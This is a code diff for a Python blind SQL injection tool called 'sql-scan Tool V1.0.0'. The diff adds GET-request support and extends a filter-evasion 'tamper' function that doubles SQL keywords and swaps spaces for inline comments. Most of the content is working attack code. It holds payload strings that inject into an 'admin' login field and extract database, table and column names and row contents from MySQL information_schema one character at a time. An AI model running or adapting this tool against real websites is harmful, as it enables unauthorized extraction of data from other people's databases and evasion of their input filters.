@@ -7,6 +7,7 @@ import re
 import time
 from bs4 import BeautifulSoup
 import threading
+import urllib.parse
 
 Version = "sql-scan Tool V1.0.0"
 Title = '''
@@ -19,7 +20,7 @@ Logo = f'''
                 {Version}  '''
 
 #响应页面关键词
-message="Logon failure"
+message="Login Success!"
 
 #要搜索的数据
 s_data="hello"
@@ -32,49 +33,51 @@ high = 128
 timeout=50
 
 #爆破数据库的数量
-database_num="admin' anandd (selselectect count(schema_name) frfromom infoorrmation_schema.schemata whewherere schema_name NOT IN ('infoorrmation_schema', 'mysql', 'perfoorrmance_schema', 'sys')) = {}#"
+database_num="admin' and (select count(schema_name) from information_schema.schemata where schema_name NOT IN ('information_schema', 'mysql', 'performance_schema', 'sys')) = {}#"
 
 #爆破库名ascii码值的payload
-database_size="admin' anandd ascasciiii(subsubstrstr((selselectect schema_name frfromom infoorrmation_schema.schemata whewherere schema_name NOT IN ('infoorrmation_schema', 'mysql', 'perfoorrmance_schema', 'sys') limit {},1),{},1)) = {} #"
+database_size="admin' and ascii(substr((select schema_name from information_schema.schemata where schema_name NOT IN ('information_schema', 'mysql', 'performance_schema', 'sys') limit {},1),{},1)) = {} #"
 
 #爆破表得个数
-num_table="admin' anandd (selselectect count(TABLE_NAME) frfromom infoorrmation_schema.TABLES whewherere TABLE_SCHEMA='{}') = {}#"
+num_table="admin' and (select count(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA='{}') = {}#"
 
 #爆破表的长度的payload
-len_table="admin' anandd (selselectect length(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema='{}' limit {},1)={}#"
+len_table="admin' and (select length(table_name) from information_schema.tables where table_schema='{}' limit {},1)={}#"
 
 #爆破表名的ascii码值的payload
-table_size="admin' aandnd asasciicii(subsubstrstr((seleselectct table_name frfromom infoorrmation_schema.tables whewherere table_schema = '{}' limit {},1),{},1))={}#"
+table_size="admin' and ascii(substr((select table_name from information_schema.tables where table_schema = '{}' limit {},1),{},1))={}#"
 
 #爆破列的数量
-num_column="admin' anandd (selselectect count(column_name) frfromom infoorrmation_schema.columnS whewherere table_name='{}') = {}#"
+num_column="admin' and (select count(column_name) from information_schema.columnS where table_name='{}') = {}#"
 
 #爆破列的长度
-len_column="admin' anandd (selselectect length(column_name) frfromom infoorrmation_schema.columnS whewherere table_name='{}' limit {},1) = {}#"
+len_column="admin' and (select length(column_name) from information_schema.columnS where table_name='{}' limit {},1) = {}#"
 
 #爆破列名
-column_size="admin' anandd asasciicii(subsubstrstr((selselectect column_name frfromom infoorrmation_schema.columns whewherere table_name='{}' limit {},1),{},1)) = {}#"
+column_size="admin' and ascii(substr((select column_name from information_schema.columns where table_name='{}' limit {},1),{},1)) = {}#"
 
 #爆破表中的数据数量
-num_data="admin' aandnd (selselectect count(concat({})) frfromom {})={}#"
+num_data="admin' and (select count(concat({})) from {})={}#"
 
 #爆破表中数据的长度
-len_data="admin' aandnd (selselectect length({}) frfromom {} limit {},1)={}#"
+len_data="admin' and (select length({}) from {} limit {},1)={}#"
 
 #爆破表中的数据
-size_data="admin' aandnd asasciicii(subsubstrstr((selselectect {} frfromom {} limit {},1),{},1))={}#"
+size_data="admin' and ascii(substr((select {} from {} limit {},1),{},1))={}#"
 
 
 #get请求
 def get(url,payload):
-    url=url+payload
+    payload_temp= urllib.parse.quote(tamper(payload))
+    url=url.replace("*",payload_temp)
     result = requests.get(url,timeout=timeout).text
     #print("你访问的url为：",url,"\t访问方式为get")
     return result
 
 #post请求
 def post(url,payload,data):
-    data = data.replace('*',payload)
+    payload_temp= tamper(payload)
+    data = data.replace('*',payload_temp)
     headers = {"Content-Type": "application/x-www-form-urlencoded"}
     result = requests.post(url,data=data,headers=headers,timeout=timeout).text
     #print("你访问的url为：",url,"\t访问方式为post")
@@ -82,6 +85,7 @@ def post(url,payload,data):
 
 #双写绕过脚本
 def tamper(payload):
+    payload= re.sub(' ' , '/**/',payload,flags=re.IGNORECASE)
     payload= re.sub('or' , 'oorr',payload,flags=re.IGNORECASE)
     payload= re.sub('by' , 'bbyy',payload,flags=re.IGNORECASE)
     payload= re.sub('if' , 'iiff',payload,flags=re.IGNORECASE)
@@ -92,10 +96,12 @@ def tamper(payload):
     payload= re.sub('union' , 'uniunionon',payload,flags=re.IGNORECASE)
     payload= re.sub('sleep' , 'slesleepep',payload,flags=re.IGNORECASE)
     payload= re.sub('where' , 'whewherere',payload,flags=re.IGNORECASE)
+    payload= re.sub('ascii' , 'ascasciiii',payload,flags=re.IGNORECASE)
     payload= re.sub('select' , 'selselectect',payload,flags=re.IGNORECASE)
     payload= re.sub('substr' , 'subsubstrstr',payload,flags=re.IGNORECASE)
     retVal=payload
     return retVal
+
 
 
 #搜索对应数据
@@ -119,7 +125,11 @@ def fuzz_D_num(url,method,data):
     if data==None:
         data =''
     if method =='get':
-        result = get(url,payload)
+        for num in range(1,20):
+            payload = database_num.format(num)
+            result = get(url,payload)
+            if message in result:
+                return num
     elif method =='post':
         for num in range(1,20):
             payload = database_num.format(num)
@@ -136,7 +146,20 @@ def fuzz_D_len(url,method,data,num_database):
             if data==None:
                 data =''
             if method =='get':
-                result = get(url,payload)
+                #猜数据库长度
+                for num in range(0,num_database):
+                    for len in range (1,21):
+                        payload_temp = payload.format(num,len)
+                        #payload = (payload.replace("*",str(len)))
+                        result = get(url,payload_temp)
+                        if message in result:
+                            #print(result)
+                            #print("第{}数据库的长度为：{}".format((num+1),len))
+                            database_Len_result[num] = len 
+                            #payload = payload.replace(str(len),"*")
+                            break
+                        #payload = payload.replace(str(len),"*")
+                return database_Len_result
             elif method =='post':
                 #猜数据库长度
                 for num in range(0,num_database):
@@ -158,7 +181,21 @@ def fuzz_D_size(url,method,data,num_D,len):
     if data==None:
         data =''
     if method =='get':
-        result = get(url,payload)
+        for num in range(0,num_D):
+            time = 1
+            print("第{}个数据库名为:".format(num+1),end='')
+            while time <= len[num]:
+                #payload = payload.replace("len",str(time))
+                for i in range (low,high+1):
+                    #payload = payload.replace("size",str(mid))
+                    payload = database_size.format(num,time,i)
+                    result = get(url,payload)
+                    if message in result:
+                        print(chr(i),end='')
+                        break
+                #payload = payload.replace(str(time),"len")
+                time += 1
+            print("")
     elif method =='post':
         for num in range(0,num_D):
             time = 1
@@ -181,7 +218,13 @@ def fuzz_T_num(url,method,data,database_name):
     if data==None:
         data =''
     if method =='get':
-        result = get(url,payload)
+        #猜表数量
+        for num in range(0,50):
+            payload=num_table.format(database_name,num)
+            result = result = get(url,payload)
+            if message in result:
+                print("表的数量为："+str(num))
+                return num
     elif method =='post':
         #猜表数量
         for num in range(0,50):
@@ -197,7 +240,17 @@ def fuzz_T_len(url,method,data,num,database_name):
     if data==None:
         data =''
     if method =='get':
-        result = get(url,payload)
+        #猜表长度
+        Length={}
+        for n in range(1,num+1):
+            for len in range(1,20):
+                payload=len_table.format(database_name,(n-1),len)
+                result = get(url,payload)
+                if message in result:
+                    #print("第{}个表的长度为：".format(n)+str(len))
+                    Length[n-1]=len
+                    break
+        return Length
     elif method =='post':
         #猜表长度
         Length={}
@@ -217,7 +270,21 @@ def fuzz_T_size(url,len_T,method,data,num,database_name):
         data =''
     time = 1
     if method =='get':
-        result = get(url,payload)
+        for n in range(1,num+1):
+            print("第{}个表名为:".format(n),end='')
+            while time <= len_T[n-1]:
+                #payload = payload.replace("len",str(time))
+                for i in range (low,high):
+                    #payload = payload.replace("size",str(mid))
+                    payload = table_size.format(database_name,(n-1),time,i)
+                    result = get(url,payload)
+                    if message in result:
+                        print(chr(i),end='')
+                        break
+                #payload = payload.replace(str(time),"len")
+                time += 1
+            print("\n")
+            time = 1
     elif method =='post':
         for n in range(1,num+1):
             print("第{}个表名为:".format(n),end='')
@@ -233,13 +300,20 @@ def fuzz_T_size(url,len_T,method,data,num,database_name):
                 #payload = payload.replace(str(time),"len")
                 time += 1
             print("\n")
+            time = 1
 
 #爆破列的数量
 def fuzz_C_num(url,method,data,table_name):
     if data==None:
         data =''
     if method =='get':
-        result = get(url,payload)
+        #猜列数量
+        for num in range(1,20):
+            payload=num_column.format(table_name,num)
+            result = get(url,payload)
+            if message in result:
+                print("{}表的列数为：".format(table_name)+str(num))
+                return num
     elif method =='post':
         #猜列数量
         for num in range(1,20):
@@ -254,7 +328,17 @@ def fuzz_C_len(url,method,data,table_name,column_num):
     if data==None:
         data =''
     if method =='get':
-        result = get(url,payload)
+        #猜表长度
+        Length={}
+        for n in range(1,column_num+1):
+            for len in range(1,20):
+                payload=len_column.format(table_name,(n-1),len)
+                result = get(url,payload)
+                if message in result:
+                    #print("第{}个表的长度为：".format(n)+str(len))
+                    Length[n-1]=len
+                    break
+        return Length
     elif method =='post':
         #猜表长度
         Length={}
@@ -273,7 +357,22 @@ def fuzz_C_size(url,method,data,table_name,column_num,len_C):
     if data==None:
         data =''
     if method =='get':
-        result = get(url,payload)
+        for n in range(1,column_num+1):
+            time = 1
+            print("第{}列名为:".format(n),end='')
+            while time <= len_C[n-1]:
+                #payload = payload.replace("len",str(time))
+                for i in range(low,high+1):
+                    #payload = payload.replace("size",str(mid))
+                    payload = column_size.format(table_name,(n-1),time,i)
+                    result = get(url,payload)
+                    if message in result:
+                        print(chr(i),end='')
+                        break
+                    #payload = payload.replace(str(mid),"size")
+                #payload = payload.replace(str(time),"len")
+                time += 1
+            print("")
     elif method =='post':
         for n in range(1,column_num+1):
             time = 1
@@ -297,7 +396,12 @@ def fuzz_num_data(url,method,data,column_name,table_name):
     if data==None:
         data =''
     if method =='get':
-        result = get(url,payload)
+        for i in range (1,55):
+            payload = num_data.format(column_name,table_name,i)
+            result = get(url,payload)
+            if message in result:
+                print("{}表中有{}个{}".format(table_name,i,column_name))
+                return i
     elif method =='post':
         for i in range (1,55):
             payload = num_data.format(column_name,table_name,i)
@@ -312,7 +416,15 @@ def fuzz_len_data(url,method,data,column_name,table_name,data_num):
         data =''
     num_data_len={}
     if method =='get':
-        result = get(url,payload)
+        for len in range (1,data_num+1):
+            for i in range (1,55):
+                payload = len_data.format(column_name,table_name,(len-1),i)
+                result = get(url,payload)
+                if message in result:
+                    #print("{}表中{}列第{}行的长度为{}".format(table_name,column_name,len,i))
+                    num_data_len[len-1]=i
+                    break
+        return num_data_len
     elif method =='post':
         for len in range (1,data_num+1):
             for i in range (1,55):
@@ -329,7 +441,22 @@ def fuzz_size_data(url,method,data,column_name,table_name,data_num,data_len):
     if data==None:
         data =''
     if method =='get':
-        result = get(url,payload)
+        for n in range(1,data_num+1):
+            time = 1
+            print("{}表第{}列数据为:".format(table_name,n),end='')
+            while time <= data_len[n-1]:
+                #payload = payload.replace("len",str(time))
+                for i in range(low,high+1):
+                    #payload = payload.replace("size",str(mid))
+                    payload = size_data.format(column_name,table_name,(n-1),time,i)
+                    result = get(url,payload)
+                    if message in result:
+                        print(chr(i),end='')
+                        break
+                    #payload = payload.replace(str(mid),"size")
+                #payload = payload.replace(str(time),"len")
+                time += 1
+            print("")
     elif method =='post':
         for n in range(1,data_num+1):
             time = 1
